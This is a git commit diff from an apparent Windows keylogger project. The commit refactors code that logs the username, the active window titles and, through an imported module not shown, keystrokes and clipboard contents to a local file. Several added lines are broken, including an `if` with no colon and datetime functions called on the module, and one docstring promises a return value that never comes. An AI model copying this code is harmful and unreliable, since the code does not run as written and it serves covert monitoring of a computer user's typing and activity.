9907b06c4da6e4f3d5183c2107f6f21c154c0f95
Keano <keanoschoenmaeckers@outlook.com>
2023-04-10 12:57:47 +0200

    Turned active_window_and_title_grabber() into method instead of function
    Although it could be used outside of the logger-class, it probably shouldn't be used outside of that. So maybe instead of a 'grabber' it should be called a 'setter'.

--- src/monitorings_software.py
+++ src/monitorings_software.py
@@ -9,6 +9,19 @@
 import window_info_logger as wilogger
 import keystrokes_and_clipboard_logger as kclogger
 import os
+import datetime
+import getpass
+
+def note_time_every_minute(text_file):
+    if datetime.minute
+        text_file.write(f"time: {datetime.time()}")
+
+
+def initialise_log_file(text_file):
+    user = getpass.getuser()
+    text_file.write(f"User: {user}" + "\n")
+    text_file.write(f"Date & time: {datetime.now()}\n")
+    text_file.write("======================================================" + "\n")
 
 
 # Main code here
@@ -18,11 +31,12 @@ def main():
         os.remove("test.txt")
 
     with open('test.txt', 'a+', encoding="utf-8") as f:
-        wilogger.initialise_log_file(f)  # Note user info.
+        initialise_log_file(f)  # Note user info and starting date + time of keylogger.
         kc_logger_object = kclogger.KeysClipboardLogger(f)  # Start keylogger.
         window_logger_object = wilogger.WindowLogger(f)  # Start window logger.
         # kc_logger_object.start_keylogger(f)  # Uncomment this if you decide to remove it from the object's __init__.
         while True:
+            note_time_every_minute(f)
             window_logger_object.log_window()
             kc_logger_object.log_clipboard()
 
--- src/window_info_logger.py
+++ src/window_info_logger.py
@@ -7,16 +7,9 @@
 
 # Library imports here
 import win32gui
-import getpass
 
 
 # Main code here
-def initialise_log_file(text_file):
-    user = getpass.getuser()
-    text_file.write(f"User: {user}" + "\n")
-    text_file.write("======================================================" + "\n")
-
-
 def active_window_and_title_grabber():
     """
     Reports back the window that is in focus.
@@ -41,10 +34,23 @@ class WindowLogger:
         self.working_file = file
 
     def log_window(self):  # This function follows the exact same format as log_clipboard from keystrokes_and_clipboard_logger. Potential for function?
-        self.active_window, self.active_window_title = active_window_and_title_grabber()
+        self.active_window_and_title_grabber()
         if self.active_window_title != self.last_window_title:
             self.working_file.write(f"OPENED {self.active_window_title} \n")
             self.last_window_title = self.active_window_title
+
+    def active_window_and_title_grabber(self):
+        """
+        Reports back the window that is in focus.
+        :return: a tuple containing the active window handle and title
+        """
+        self.active_window = win32gui.GetForegroundWindow()
+        self.active_window_title = win32gui.GetWindowText(self.active_window)
+
+        if self.active_window == 0:
+            self.active_window_title = "Desktop"
+        elif len(self.active_window_title) == 0:
+            self.active_window_title = "Task switching"
 
 
 def main():
